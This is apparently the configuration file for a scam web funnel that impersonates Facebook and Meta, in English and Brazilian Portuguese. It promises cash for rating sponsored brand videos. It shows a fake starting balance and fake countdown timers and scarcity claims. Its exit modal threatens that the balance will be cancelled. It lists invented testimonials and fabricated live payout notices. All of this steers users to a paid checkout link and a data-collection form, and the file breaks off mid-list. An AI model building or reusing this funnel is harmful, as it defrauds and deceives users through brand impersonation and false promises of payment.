// =============================================================================
// REWARDED VIDEOS - GLOBAL CONFIGURATION (BLACK FRIDAY & FIXED LOGOS)
// =============================================================================

var CONFIG = {
  // Brand & Localization
  brandName: "Facebook",
  language: "en", // "en" for Global/International (USD) or "pt" for Brazil (BRL)
  currencySymbol: "$",
  
  // Initial Welcome Balance
  initialBalance: 32.27,

  // Rastreamento Oficial: Pixel Meta (Facebook Ads) e Utmify (Extraídos do rewardedtasks.com)
  tracking: {
    metaPixelId: "1103050168884191", // Pixel Meta Oficial do rewardedtasks.com
    utmifyPixelId: "6a8fa5e28f2a32233dd4463c" // Pixel Utmify Oficial do rewardedtasks.com
  },

  // Text strings by language
  i18n: {
    en: {
      welcomeTag: "Facebook Rewards Official",
      welcomeTitle: "🎁 Congratulations! 🎁",
      welcomeDesc: "You have been selected for Facebook's new rewards program. Enjoy!",
      welcomeBadge: "You've already earned US$ 32.27!",
      welcomeNote: "Complete all assessments and make your first withdrawal!",
      welcomeBtn: "Click to Get Started 🌐",
      welcomeLiveAuditors: "384 active evaluators in your region",
      welcomeReserveNote: "Your initial bonus is reserved until the timer expires.",
      welcomeSpotsLabel: "Black Friday Spots:",
      welcomeSpotsLeft: "Only 6 spots remaining today",
      welcomeGuarantee: "🔒 Official Meta Audit • Instant Payout Guaranteed",
      storyAlert: "🔒 This Story will only be unlocked after you finish all evaluation tasks!",
      sponsored: "Sponsored",
      likesCount: "likes",
      questionLabel: "Answer the question:",
      notRelevantBtn: "Not relevant",
      relevantBtn: "Relevant",
      evalWatchNotice: "Watch video to evaluate...",
      evalRewardNotice: "Unlocks bonus of {reward}",
      rewardTitle: "You Earned Money!",
      rewardDesc: "Your feedback was submitted successfully to Meta servers:",
      rewardContinue: "Continue to Next Video",
      vslTimerPrefix: "Your balance of",
      vslTimerSuffix: "is reserved for 14:45 min",
      vslNoticeTag: "Meta Verified • Instant Withdrawal Guide",
      vslNoticeDesc: "Official Notice: Watch this 3-minute tutorial to authenticate your bank/crypto account and withdraw your accumulated earnings.",
      vslWithdrawBtn: "REGISTER ACCOUNT & WITHDRAW NOW",
      vslWithdrawSub: "Instant Release + Daily Access to Paid Feed",
      commentsTitle: "Community Feedback",
      liveTag: "Live withdrawals",
      postCommentPlaceholder: "Add a comment...",
      postCommentBtn: "Post",
      modalCheckoutTitle: "Where should we send your withdrawal?",
      modalCheckoutDesc: "Enter your payout information to register your account and unlock your daily video queue.",
      fullNameLabel: "Full Name",
      emailLabel: "Email Address",
      submitCheckoutBtn: "RELEASE WITHDRAWAL NOW",
      sslSecure: "Meta Verified • 256-bit SSL Encrypted Connection",
      
      // Onboarding Tutorial Popup on 1st video
      tutorialTitle: "💡 Quick Guide:",
      tutorialText: "Watch the sponsored video and answer the question below. Every review instantly deposits real cash into your Facebook balance above!",
      tutorialBtn: "Start Reviewing",

      // VSL Mandatory Watch Modal (Regra de Saque)
      vslRuleTitle: "⚠️ Mandatory Payout Instruction",
      vslRuleText: "To authorize the instant release of your accumulated balance of {balance}, you must watch this official authentication tutorial until the end without closing or leaving this page. Your payout button will be unlocked automatically.",
      vslRuleBtn: "I UNDERSTAND, START TUTORIAL",

      // Push Notification Estilo Instagram/iOS
      pushApp: "Facebook Wallet",
      pushTitle: "Pending Payout: {balance}",
      pushDesc: "Your withdrawal authorization is waiting. Complete the security video to release funds.",

      // Exit Intent Modal (Anti-Abandono)
      exitTitle: "⚠️ WAIT! DO NOT LEAVE!",
      exitText: "Your accumulated balance of {balance} is reserved in your name. If you leave this page now, your balance will be CANCELLED and passed to the next evaluator!",
      exitBtnStay: "KEEP MY {balance} & RELEASE PAYOUT",
      exitBtnLeave: "I want to forfeit my earnings",

      // Task Progress Bar
      progressStep1: "Task 1 of 3: +$82.06 bonus",
      progressStep2: "Task 2 of 3: +$82.06 bonus",
      progressStep3: "Final Task: Payout unlocked next!"
    },
    pt: {
      welcomeTag: "Meta Insights Oficial",
      welcomeTitle: "🎁 Parabéns! 🎁",
      welcomeDesc: "Você foi selecionado para participar do programa oficial de auditoria de vídeos de Black Friday no Facebook.",
      welcomeBadge: "Você já ganhou R$ 48,50!",
      welcomeNote: "Avalie os vídeos patrocinados de Black Friday no feed para acumular seu saldo e solicitar seu primeiro saque via Pix!",
      welcomeBtn: "Começar Avaliações no Feed",
      welcomeLiveAuditors: "384 avaliadores ativos na sua região",
      welcomeReserveNote: "Seu bônus inicial está reservado até o cronômetro zerar.",
      welcomeSpotsLabel: "Vagas de Black Friday:",
      welcomeSpotsLeft: "Restam apenas 6 vagas hoje",
      welcomeGuarantee: "🔒 Auditoria Oficial Meta • Saque Imediato Garantido via Pix",
      storyAlert: "🔒 Este Story só será liberado após você concluir todas as tarefas de avaliação!",
      sponsored: "Patrocinado",
      likesCount: "curtidas",
      questionLabel: "Avaliação Rápida:",
      notRelevantBtn: "Não Relevante",
      relevantBtn: "Relevante",
      evalWatchNotice: "Assista ao vídeo para avaliar...",
      evalRewardNotice: "Libera bônus de {reward}",
      rewardTitle: "Você Ganhou Dinheiro!",
      rewardDesc: "Sua avaliação foi enviada com sucesso aos servidores da Meta:",
      rewardContinue: "Continuar para o Próximo Vídeo",
      vslTimerPrefix: "Seu saldo de",
      vslTimerSuffix: "está reservado por 14:45 min",
      vslNoticeTag: "Meta Verified • Tutorial de Saque Pix",
      vslNoticeDesc: "Comunicado Oficial: Assista ao tutorial de 3 minutos para autenticar sua Chave Pix e realizar o saque do seu saldo acumulado.",
      vslWithdrawBtn: "CADASTRAR CHAVE PIX E SACAR AGORA",
      vslWithdrawSub: "Liberação Imediata + Acesso Diário ao Feed Remunerado",
      commentsTitle: "Comentários da Comunidade",
      liveTag: "Saques ao vivo",
      postCommentPlaceholder: "Adicione um comentário...",
      postCommentBtn: "Publicar",
      modalCheckoutTitle: "Para qual conta enviar seu saldo?",
      modalCheckoutDesc: "Cadastre seus dados para receber o saldo acumulado e liberar a fila diária de vídeos.",
      fullNameLabel: "Nome Completo",
      emailLabel: "E-mail Cadastrado",
      submitCheckoutBtn: "LIBERAR SAQUE PIX AGORA",
      sslSecure: "Meta Verified • Ambiente Seguro SSL 256-bit",
      
      // Onboarding Tutorial Popup
      tutorialTitle: "💡 Como Funciona:",
      tutorialText: "Assista ao vídeo e responda à pergunta abaixo. Cada avaliação credita dinheiro real instantaneamente no seu saldo no topo!",
      tutorialBtn: "Começar Avaliação",

      // VSL Mandatory Watch Modal (Regra de Saque)
      vslRuleTitle: "⚠️ Instrução Obrigatória de Saque",
      vslRuleText: "Para autorizar o saque imediato do seu saldo acumulado de {balance}, você precisa assistir a este tutorial oficial de autenticação até o final sem sair desta página. O botão de cadastro da sua Chave Pix será liberado automaticamente.",
      vslRuleBtn: "ENTENDI, INICIAR TUTORIAL",

      // Push Notification Estilo Instagram/iOS
      pushApp: "Facebook Wallet",
      pushTitle: "Saque Pendente: {balance}",
      pushDesc: "Sua autorização de Pix está aguardando. Conclua o vídeo de segurança para liberar.",

      // Exit Intent Modal (Anti-Abandono)
      exitTitle: "⚠️ ESPERE! NÃO FECHE A PÁGINA!",
      exitText: "O seu saldo acumulado de {balance} está reservado no seu nome. Se você fechar ou sair agora, seu saldo será CANCELADO e transferido para o próximo usuário da fila!",
      exitBtnStay: "MANTER MEUS {balance} E SACAR AGORA",
      exitBtnLeave: "Quero abrir mão do meu dinheiro",

      // Task Progress Bar
      progressStep1: "Tarefa 1 de 3: +R$ 82,06 de bônus",
      progressStep2: "Tarefa 2 de 3: +R$ 82,06 de bônus",
      progressStep3: "Última Tarefa: Saque Pix liberado a seguir!"
    }
  },

  // Logos em SVG / Data URI 100% fiéis às marcas oficiais
  brandLogos: {
    amazon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 603 603'%3E%3Crect width='603' height='603' rx='301' fill='%23FFFFFF'/%3E%3Cg transform='translate(0, 210)'%3E%3Cpath fill='%23FF9900' d='m 374,142 c -35,26 -85,40 -129,40 -61,0 -116,-23 -158,-60 -3,-3 0,-7 4,-5 45,26 101,42 158,42 39,0 81,-8 121,-25 6,-2 11,4 5,8'/%3E%3Cpath fill='%23FF9900' d='m 389,126 c -4,-6 -30,-3 -41,-1 -3,0 -4,-3 -1,-5 20,-14 53,-10 57,-5 4,5 -1,38 -20,53 -3,2 -6,1 -4,-2 4,-11 14,-34 9,-40'/%3E%3Cpath fill='%23111' d='M 348,20 V 6 c 0,-2 2,-3 3,-3 h 61 c 2,0 4,1 4,3 v 12 c 0,2 -2,5 -5,9 l -32,45 c 12,0 24,1 35,7 2,1 3,3 3,5 v 15 c 0,2 -2,4 -5,3 -19,-10 -44,-11 -65,0 -2,1 -4,-1 -4,-3 V 86 c 0,-2 0,-6 2,-9 l 37,-53 h -32 c -2,0 -4,-1 -4,-3'/%3E%3Cpath fill='%23111' d='m 125,105 h -19 c -2,0 -3,-1 -3,-3 V 7 c 0,-2 2,-4 4,-4 h 17 c 2,0 3,2 3,3 v 13 h 1 c 4,-12 13,-18 24,-18 12,0 19,6 24,18 5,-12 15,-18 26,-18 8,0 16,3 22,10 6,8 5,20 5,30 v 60 c 0,2 -2,4 -4,4 h -18 c -2,0 -3,-2 -3,-4 V 51 c 0,-4 0,-14 -1,-18 -1,-6 -5,-8 -11,-8 -4,0 -9,3 -11,8 -2,5 -2,13 -2,18 v 51 c 0,2 -1,4 -3,4 h -19 c -2,0 -3,-2 -3,-4 L 153,51 c 0,-11 2,-26 -11,-26 -14,0 -13,15 -13,26 v 51 c 0,2 -2,4 -4,4'/%3E%3Cpath fill='%23111' d='m 470,1 c 27,0 42,24 42,54 0,29 -16,52 -42,52 -27,0 -42,-23 -42,-53 0,-30 15,-53 42,-53 m 0,20 c -14,0 -15,18 -15,30 0,12 0,37 15,37 14,0 15,-20 15,-32 0,-8 0,-18 -3,-26 -2,-6 -6,-9 -12,-9'/%3E%3Cpath fill='%23111' d='M 548,105 H 529 c -2,0 -3,-2 -3,-3 l 0,-96 c 0,-2 2,-3 4,-3 h 17 c 2,0 3,1 3,3 v 14 h 1 c 5,-13 12,-19 25,-19 8,0 17,3 22,11 5,8 5,21 5,30 v 60 c 0,2 -2,3 -4,3 h -18 c -2,0 -3,-1 -3,-3 V 50 c 0,-10 1,-25 -12,-25 -4,0 -8,3 -10,7 -3,6 -3,12 -3,19 v 51 c 0,2 -2,4 -4,4'/%3E%3Cpath fill='%23111' d='M 55,60 V 56 c -13,0 -27,3 -27,19 0,8 4,13 11,13 5,0 10,-3 13,-8 4,-7 3,-13 3,-20 m 19,45 c -1,1 -3,1 -4,1 -7,-5 -8,-8 -11,-13 -10,10 -17,13 -31,13 -15,0 -28,-9 -28,-29 0,-15 8,-25 20,-30 10,-5 24,-5 35,-7 v -2 c 0,-5 0,-10 -2,-14 -2,-3 -7,-5 -11,-5 -7,0 -13,4 -15,11 0,2 -1,4 -3,4 L 6,33 C 5,32 3,31 3,29 8,7 27,0 45,0 c 9,0 21,3 28,10 9,8 8,19 8,32 v 29 c 0,8 4,12 7,17 1,2 2,4 0,5 -4,3 -11,9 -14,12'/%3E%3C/g%3E%3C/svg%3E",
    apple: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='50' fill='%23F5F5F7'/%3E%3Cg transform='translate(23, 14) scale(0.065)'%3E%3Cpath fill='%23000000' d='M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105.6-57-155.5-127C46.7 790.7 0 663 0 541.8c0-194.4 126.4-297.5 250.8-297.5 66.1 0 121.2 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.5c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z'/%3E%3C/g%3E%3C/svg%3E",
    nike: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='50' fill='%23000000'/%3E%3Cg transform='translate(15, 34) scale(0.07)'%3E%3Cpath fill='%23FFFFFF' d='M245.8 717.6c-29.8-1.2-54.2-9.3-73.2-24.5-3.6-2.9-12.3-11.6-15.2-15.2-7.7-9.7-13-19.2-16.5-29.7-10.8-32.3-5.2-74.7 15.9-121.2 18.1-39.8 46-79.3 94.6-134.1 7.2-8.1 28.5-31.6 28.7-31.6.1 0-1.1 2-2.6 4.5-12.7 21.2-23.5 46.2-29.4 67.8-9.5 34.7-8.3 64.4 3.3 87.5 8.1 15.9 21.9 29.7 37.4 37.3 27.2 13.3 67 14.4 115.6 3.2 3.3-.8 169.2-44.8 368.6-97.8 199.4-53 362.5-96.4 362.5-96.4s-463.2 198.3-703.6 301.1c-38.1 16.3-48.3 20.4-66.2 26.7-45.8 16.1-86.8 23.7-119.9 22.4z'/%3E%3C/g%3E%3C/svg%3E",
    starbucks: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Ccircle cx='12' cy='12' r='12' fill='%2300704A'/%3E%3Cpath fill='%23FFFFFF' d='M13.2072 5.2801c-.1052-.0188-.6126-.104-1.2072-.104s-1.102.0848-1.2072.104c-.0605.0108-.0837-.0484-.0377-.0828.0417-.0308 1.2445-.9463 1.2445-.9463l1.244.9463c.0469.0344.024.0936-.0364.0828zm-2.0783 5.9446s-.0636.0228-.0804.0788c.252.1937.4257.6343.9515.6343s.6995-.4406.9511-.6343c-.0164-.0564-.08-.0788-.08-.0788s-.3293.0776-.8711.0776c-.5418 0-.8711-.0776-.8711-.0776zM12 10.4832c-.146 0-.178-.0552-.2777-.0548-.0948.0004-.2789.076-.319.1453a.1542.1542 0 00.0413.0948c.2129.032.309.1505.5558.1505.2469 0 .3425-.1185.5558-.1505a.1579.1579 0 00.0412-.0948c-.0396-.0692-.224-.1445-.3193-.1453-.1-.0008-.1324.0548-.2781.0548zm11.9868 2.27a11.964 11.964 0 01-.076.8528c-1.359.2249-1.8447-.986-3.2368-.9252.0832.2954.1508.5963.2029.9036 1.148-.0008 1.6105 1.0724 2.8878.9143-.0672.3281-.148.6519-.2413.9708-1.01.0992-1.3657-.9044-2.5345-.8767.0096.1664.0148.3345.0148.5041l-.0048.2805 2.2696.866a12.04 12.04 0 01-.3965.9479c-.6823-.0376-.9175-.9127-1.9555-.8431a9.0882 9.0882 0 01-.118.665c.9015-.0632 1.0955.7667 2.0195.9188a12.001 12.001 0 01-.5808.8247l-2.073-1.0583c-.1565.0932-.3213.1764-.4925.2485l.659 2.2287a11.972 11.972 0 01-.734.7336l-1.3855-1.8624c-.164.048-.3324.0848-.5041.1113l.1157 2.308a12.022 12.022 0 01-.8616.4952l-.8419-2.1448c-.1648.0168-.3324.0252-.5009.0252s-.336-.0084-.5009-.0252l-.8419 2.1448a12.022 12.022 0 01-.8616-.4952l.1157-2.308c-.1717-.0265-.34-.0633-.5041-.1113l-1.3855 1.8624a11.972 11.972 0 01-.734-.7336l.659-2.2287c-.1712-.0721-.336-.1553-.4925-.2485l-2.073 1.0583a12.001 12.001 0 01-.5808-.8247c.924-.1521 1.118-.982 2.0195-.9188a9.0882 9.0882 0 01-.118-.665c-1.038-.0796-1.2732.8055-1.9555.8431a12.04 12.04 0 01-.3965-.9479l2.2696-.866-.0048-.2805c0-.1696.0052-.3377.0148-.5041-1.1688-.0277-1.5245.9759-2.5345.8767-.0933-.3189-.1741-.6427-.2413-.9708 1.2773.1581 1.7398-.9151 2.8878-.9143.0521-.3073.1197-.6082.2029-.9036-1.3921-.0608-1.8778 1.1501-3.2368.9252a11.964 11.964 0 01-.076-.8528c1.1612.1857 1.6248-.8228 2.7669-.7608.2045-.6353.4687-1.2464.7877-1.8217-1.0772.4549-1.6882-.4728-2.6738-.1121-.1372-.2505-.2853-.4937-.4441-.7285 1.0991-.3229 1.4085.6601 2.4764.3857.3229-.5333.6933-1.0312 1.1037-1.4877-1.0266-.4117-1.5794.5161-2.5401.0356.3473-.5541.7481-1.0664 1.196-1.5309-1.404.9125-1.0028-.2788-2.2831.3325.4385-.5622.9272-1.0827 1.4589-1.5541-.8375-.6888-.3445-1.5701-1.0945-2.1887.5181-.4629 1.0763-.8897 1.6687-1.2727-.2609-1.0963 1.1573-.7871 1.5577-1.8021.5714-.3389 1.178-.627 1.8127-.8598-.0148 1.1692 1.0425 1.5761 1.0713 2.7297.6393-.2081 1.3039-.3489 1.9877-.4173-.5185-1.0621.7248-1.4429 1.4725-2.2533.6347.2328 1.2413.5209 1.8127.8598.4004 1.015 1.8186.7058 1.5577 1.8021.5924.383 1.1506.8098 1.6687 1.2727-.75.6186-.257 1.5 1.0945 2.1887.5317.4714 1.0204.9919 1.4589 1.5541-1.2803-.6113-.8791.585-2.2831-.3325.4479.4645.8487.9768 1.196 1.5309-.9607.4805-1.5135-.4473-2.5401-.0356.4104.4565.7808.9544 1.1037 1.4877 1.0679.2744 1.3773-.7086 2.4764-.3857-.1588.2348-.3069.478-.4441.7285-.9856-.3607-1.5966.567-2.6738.1121.319.5753.5832 1.1864.7877 1.8217 1.1421-.062 1.6057.9465 2.7669.7608z'/%3E%3C/svg%3E",
    samsung: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='50' fill='%231428A0'/%3E%3Cellipse cx='50' cy='50' rx='45' ry='24' transform='rotate(-14 50 50)' fill='none' stroke='%23FFFFFF' stroke-width='3'/%3E%3Ctext x='50' y='55' font-family='Arial, sans-serif' font-weight='900' font-size='12.5' fill='%23FFFFFF' text-anchor='middle' letter-spacing='1'%3ESAMSUNG%3C/text%3E%3C/svg%3E",
    adidas: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 28 28'%3E%3Ccircle cx='14' cy='14' r='14' fill='%23000000'/%3E%3Cg transform='translate(2, 2)'%3E%3Cpath fill='%23FFFFFF' d='m24 19.535-8.697-15.07-4.659 2.687 7.145 12.383Zm-8.287 0L9.969 9.59 5.31 12.277l4.192 7.258ZM4.658 14.723l2.776 4.812H1.223L0 17.41Z'/%3E%3C/g%3E%3C/svg%3E"
  },

  // Stories Carousel (Logos 100% corretas em SVG)
  stories: [
    {
      id: "s1",
      username: "amazon",
      displayName: "Amazon",
      brandKey: "amazon",
      isLive: true
    },
    {
      id: "s2",
      username: "apple",
      displayName: "Apple",
      brandKey: "apple",
      hasRing: true
    },
    {
      id: "s3",
      username: "nike",
      displayName: "Nike",
      brandKey: "nike",
      hasRing: true
    },
    {
      id: "s4",
      username: "starbucks",
      displayName: "Starbucks",
      brandKey: "starbucks",
      hasRing: true
    },
    {
      id: "s5",
      username: "samsung",
      displayName: "Samsung",
      brandKey: "samsung",
      hasRing: true
    },
    {
      id: "s6",
      username: "adidas",
      displayName: "Adidas",
      brandKey: "adidas",
      hasRing: true
    }
  ],
  
  // Black Friday Tasks with Real Videos & Unlock Delays (1º vídeo: 3s, 2º vídeo: 7s, 3º vídeo: 10s)
  taskDelays: [3, 3, 3],
  tasks: [
    {
      id: 1,
      creatorName: "amazon",
      displayName: "Amazon",
      brandKey: "amazon",
      verified: true,
      videoUrl: "assets/videos/video1.mp4",
      posterUrl: "https://images.unsplash.com/photo-1607082348824-0a96f2a4b9da?w=600&h=600&fit=crop",
      caption: "Black Friday Week is officially live! 🛍️ Enjoy up to 70% off millions of early holiday deals with free Prime delivery. #BlackFriday #AmazonDeals",
      captionPt: "A Semana Black Friday começou oficialmente! 🛍️ Aproveite até 70% de desconto em milhares de ofertas com frete grátis no Prime. #BlackFriday #AmazonOfertas",
      likes: "64.820",
      reward: 82.06,
      question: "Is this photo relevant to you?",
      questionPt: "Este anúncio de Black Friday é relevante para você?"
    },
    {
      id: 2,
      creatorName: "apple",
      displayName: "Apple",
      brandKey: "apple",
      verified: true,
      videoUrl: "assets/videos/video2.mp4",
      posterUrl: "https://images.unsplash.com/photo-1510519138161-584462329710?w=600&h=600&fit=crop",
      caption: "The Apple Holiday Shopping Event. Get an Apple Gift Card up to $200 with your Black Friday purchase of iPhone 14 Pro, Mac, or Apple Watch. #ShotOniPhone #AppleHoliday",
      captionPt: "O evento de fim de ano da Apple começou. Ganhe até R$ 800 em créditos nas compras elegíveis durante a Black Friday. #ShotOniPhone #Apple",
      likes: "148.950",
      reward: 82.06,
      question: "Would you watch this content?",
      questionPt: "Você assistiria a este vídeo até o final no seu feed?"
    },
    {
      id: 3,
      creatorName: "Starbucks",
      displayName: "Starbucks",
      brandKey: "starbucks",
      verified: true,
      videoUrl: "assets/videos/video3.mp4",
      posterUrl: "https://images.unsplash.com/photo-1517256064527-09c73fc73e38?w=600&h=600&fit=crop",
      caption: "Say hello, to the newest Nitro 😍 Introducing the new Cinnamon Caramel Cream Nitro Cold Brew.",
      captionPt: "Apresentamos o novo Nitro 😍 Cinnamon Caramel Cream Nitro Cold Brew.",
      likes: "12.5 mil",
      reward: 82.06,
      question: "Do you find this interesting?",
      questionPt: "Você acha este conteúdo interessante?"
    }
  ],

  // Final Step: Withdrawal & Official VSL
  vsl: {
    playerType: "vturb",
    vturbPlayerId: "vid-6aabfaaad1a5582ed949f5b5",
    vturbScriptUrl: "https://scripts.converteai.net/f0aeecae-2e61-4c86-8c78-5571d1efbda9/players/6aabfaaad1a5582ed949f5b5/v4/player.js",
    fallbackVideoUrl: "assets/videos/video2.mp4",
    pitchDelaySeconds: 10, // 10s para teste imediato do botão de saque (original é 1223s)
    checkoutUrl: "https://checkout.cooud.com/01M32DGN4ZTTHTAM6456KCRKJE"
  },

  // Social Proof Comments
  comments: [
    {
      avatar: "https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=80&h=80&fit=crop&crop=faces",
      username: "sarah_miller",
      time: "2m",
      content: "OMG!! Just withdrew $278.45 to my PayPal account! I can't believe this actually works! 😱🎉💸",
      contentPt: "Gente, acabei de sacar R$ 294,50 pelo Pix! Achei que era mentira mas caiu na hora no meu Nubank! 😍🎉",
      likes: 218
    },
    {
      avatar: "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=80&h=80&fit=crop&crop=faces",
      username: "mike_rodriguez",
      time: "5m",
      content: "YESSS! $345 just hit my bank account! Meta pays so fast for reviewing Black Friday ads! 🤑💰",
      contentPt: "Muito top a iniciativa de remunerar quem avalia os anúncios de Black Friday. Já estou no 2º dia e saquei R$ 420 ontem!",
      likes: 184
    },
    {
      avatar: "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=80&h=80&fit=crop&crop=faces",
      username: "emily_chen",
      time: "9m",
      content: "I'm literally shaking! $425 just deposited! Watched the tutorial and got access immediately! 🙏❤️",
      contentPt: "Assisti o tutorial do suporte, cadastrei a chave e liberou 15 vídeos novos pra avaliar. Valeu muito a pena 🙏❤️",
      likes: 147
    },
    {
      avatar: "https://images.unsplash.com/photo-1522075469751-3a6694fb2f61?w=80&h=80&fit=crop&crop=faces",
      username: "david_kim",
      time: "14m",
      content: "Best rewards system of 2026. Made my fee back 10x already doing reviews during lunch break. 🚀",
      contentPt: "Melhor funil de tarefas de 2026. Já paguei a taxa da licença e saquei na hora.",
      likes: 92
    }
  ],

  // Live Payout Toasts (Prova Social Dinâmica Sem Repetição)
  livePayouts: {
    en: [
      { name: "Michael R.", location: "Austin, TX", amount: "$278.45", time: "14s ago" },
      { name: "Sarah K.", location: "Miami, FL", amount: "$278.45", time: "22s ago" },
      { name: "David L.", location: "Los Angeles, CA", amount: "$342.10", time: "35s ago" },
      { name: "Jessica M.", location: "Chicago, IL", amount: "$278.45", time: "48s ago" },
      { name: "James T.", location: "New York, NY", amount: "$278.45", time: "1m ago" },
      { name: "Emily W.", location: "Seattle, WA", amount: "$315.80", time: "2m ago" },
      { name: "Christopher B.", location: "Atlanta, GA", amount: "$278.45", time: "2m ago" },
      { name: "Ashley N.", location: "Denver, CO", amount: "$294.50", time: "3m ago" },
      { name: "Matthew P.", location: "Phoenix, AZ", amount: "$278.45", time: "3m ago" },
      { name: "Amanda J.", location: "Boston, MA", amount: "$326.20", time: "4m ago" },
      { name: "Joshua D.", location: "San Diego, CA", amount: "$278.45", time: "4m ago" },
      { name: "Megan C.", location: "Dallas, TX", amount: "$354.00", time: "5m ago" },
      { name: "Daniel H.", location: "Las Vegas, NV", amount: "$278.45", time: "6m ago" },
      { name: "Lauren S.", location: "Orlando, FL", amount: "$278.45", time: "6m ago" },
      { name: "Andrew V.", location: "Portland, OR", amount: "$312.80", time: "7m ago" },
      { name: "Rachel G.", location: "Charlotte, NC", amount: "$278.45", time: "8m ago" },
      { name: "Brandon E.", location: "Nashville, TN", amount: "$289.90", time: "8m ago" },
      { name: "Stephanie F.", location: "Philadelphia, PA", amount: "$278.45", time: "9m ago" },
      { name: "Tyler O.", location: "Houston, TX", amount: "$345.00", time: "10m ago" },
      { name: "Nicole Y.", location: "San Jose, CA", amount: "$278.45", time: "11m ago" },
      { name: "Justin K.", location: "Minneapolis, MN", amount: "$298.50", time: "12m ago" },
      { name: "Brittany L.", location: "Tampa, FL", amount: "$278.45", time: "13m ago" },
      { name: "Ryan M.", location: "Salt Lake City, UT", amount: "$334.20", time: "14m ago" },
      { name: "Samantha R.", location: "San Antonio, TX", amount: "$278.45", time: "15m ago" },
      { name: "Kevin W.", location: "Sacramento, CA", amount: "$278.45", time: "16m ago" },
      { name: "Kimberly T.", location: "Columbus, OH", amount: "$319.40", time: "17m ago" },
      { name: "Eric B.", location: "Indianapolis, IN", amount: "$278.45", time: "18m ago" },
      { name: "Heather Z.", location: "Kansas City, MO", amount: "$282.10", time: "19m ago" },
      { name: "Brian D.", location: "Raleigh, NC", amount: "$278.45", time: "20m ago" },
      { name: "Kayla Q.", location: "Fort Lauderdale, FL", amount: "$360.00", time: "21m ago" },
      { name: "Jacob A.", location: "St. Louis, MO", amount: "$278.45", time: "22m ago" },
      { name: "Melissa N.", location: "Jacksonville, FL", amount: "$292.00", time: "23m ago" },
      { name: "Ethan C.", location: "Pittsburgh, PA", amount: "$278.45", time: "24m ago" },
      { name: "Taylor H.", location: "Scottsdale, AZ", amount: "$310.50", time: "25m ago" },
      { name: "Nathan G.", location: "Honolulu, HI", amount: "$278.45", time: "26m ago" }
    ],
    pt: [
      { name: "Matheus S.", location: "São Paulo, SP", amount: "R$ 278,45", time: "há 14s" },
      { name: "Beatriz M.", location: "Belo Horizonte, MG", amount: "R$ 278,45", time: "há 22s" },
      { name: "Lucas F.", location: "Curitiba, PR", amount: "R$ 342,10", time: "há 35s" },
      { name: "Juliana R.", location: "Rio de Janeiro, RJ", amount: "R$ 278,45", time: "há 48s" },
      { name: "Gabriel P.", location: "Goiânia, GO", amount: "R$ 278,45", time: "há 1 min" },
      { name: "Camila N.", location: "Fortaleza, CE", amount: "R$ 315,80", time: "há 2 min" },
      { name: "Rodrigo T.", location: "Porto Alegre, RS", amount: "R$ 278,45", time: "há 2 min" },
      { name: "Amanda C.", location: "Florianópolis, SC", amount: "R$ 294,50", time: "há 3 min" },
      { name: "Felipe B.", location: "Salvador, BA", amount: "R$ 278,45", time: "há 3 min" },
      { name: "Larissa D.", location: "Brasília, DF", amount: "R$ 326,20", time: "há 4 min" },
      { name: "Thiago M.", location: "Campinas, SP", amount: "R$ 278,45", time: "há 4 min" },
      { name: "Vanessa O.", location: "Recife, PE", amount: "R$ 354,00", time: "há 5 min" },
      { name: "Bruno A.", location: "Vitória, ES", amount: "R$ 278,45", time: "há 6 min" },
      { name: "Letícia G.", location: "Cuiabá, MT", amount: "R$ 278,45", time: "há 6 min" },
      { name: "Leonardo K.", location: "Joinville, SC", amount: "R$ 312,80", time: "há 7 min" },
      { name: "Mariana H.", location: "Manaus, AM", amount: "R$ 278,45", time: "há 8 min" },
      { name: "Rafael V.", location: "Londrina, PR", amount: "R$ 289,90", time: "há 8 min" },
      { name: "Natália Z.", location: "Ribeirão Preto, SP", amount: "R$ 278,45", time: "há 9 min" },
      { name: "Gustavo L.", location: "Santos, SP", amount: "R$ 345,00", time: "há 10 min" },
      { name: "Caroline E.", location: "Campo Grande, MS", amount: "R$ 278,45", time: "há 11 min" },
      { name: "Diego P.", location: "São José dos Campos, SP", amount: "R$ 298,50", time: "há 12 min" },
      { name: "Patrícia X.", location: "Niterói, RJ", amount: "R$ 278,45", time: "há 13 min" },
      { name: "Marcelo Q.", location: "Natal, RN", amount: "R$ 334,20", time: "há 14 min" },
      { name: "Priscila S.", location: "João Pessoa, PB", amount: "R$ 278,45", time: "há 15 min" },
      { name: "André W.", location: "Maringá, PR", amount: "R$ 278,45", time: "há 16 min" },
      { name: "Jéssica B.", location: "Uberlândia, MG", amount: "R$ 319,40", time: "há 17 min" },
      { name: "Vinícius R.", location: "Sorocaba, SP", amount: "R$ 278,45", time: "há 18 min" },
      { name: "Bruna T.", location: "Aracaju, SE", amount: "R$ 282,10", time: "há 19 min" },
      { name: "Eduardo F.", location: "Maceió, AL", amount: "R$ 278,45", time: "há 20 min" },
      { name: "Tatiana L.", location: "Caxias do Sul, RS", amount: "R$ 360,00", time: "há 21 min" },
      { name: "Caio N.", location: "Teresina, PI", amount: "R$ 278,45", time: "há 22 min" },
      { name: "Fernanda M.", location: "São Luís, MA", amount: "R$ 292,00", time: "há 23 min" },
